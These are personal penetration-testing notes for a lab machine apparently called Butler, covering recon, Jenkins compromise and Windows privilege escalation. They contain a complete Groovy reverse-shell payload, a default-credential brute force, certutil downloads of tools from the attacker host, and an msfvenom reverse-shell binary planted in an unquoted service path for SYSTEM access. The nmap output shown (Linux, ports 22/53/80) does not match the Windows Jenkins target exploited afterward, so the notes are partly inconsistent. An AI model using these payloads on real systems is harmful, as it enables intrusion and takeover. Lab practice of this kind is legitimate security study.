```shell
netdiscover -r 192.168.57.0/24
# 192.168.57.11

nmap -T4 -p 1-10000 -A 192.168.57.11
```
- results

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-11 12:57 EST
Nmap scan report for 192.168.57.11
Host is up (0.0081s latency).
Not shown: 9997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.12 seconds
```
- http - 8080:
	* jenkins
	* https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins
	* 
* try bruteforcing in burp suite
	* clusterbomb
	* **jenkins:jenkins**
* jenkins has a console that is vulnerable to input
	* groovy code
```bash
nc -nvlp 4000

String host="192.168.57.7";int port=4000;String cmd="cmd.exe";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
* got rev shell
* use winpeas
```bash
mv winPEASx64.exe transfer/winpeas.exe
cd transfer/
python3 -m http.server 
```

```powershell
cd C:\Users
cd butler 
certutil.exe -urlcache -f http://192.168.57.7/winpeas.exe winpeas.exe # trasnfer file
winpeas.exe 
# 'No quotes and spaces' for Wise Care 365
# ...\Wise Care 365\...
# windows tries the path split on each space recursively until it finds one that works
# =>  allows unintended  exe executables
```

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.57.7 LPORT=5000 -f exe > Wise.exe
# shell as Wise.exe file
python3 -m http.server 80
nc -nvlp 5000
```

```shell
#in Butler
cd C:\
cd "Program Files (x86)\Wise"

certutil.exe -urlcache -f http://192.168.57.7/Wise.exe Wise.exe

#restart wise care
sc stop WiseBootAssistant
sc query WiseBootAssistant 
sc start WiseBootAssistant 
# root access
```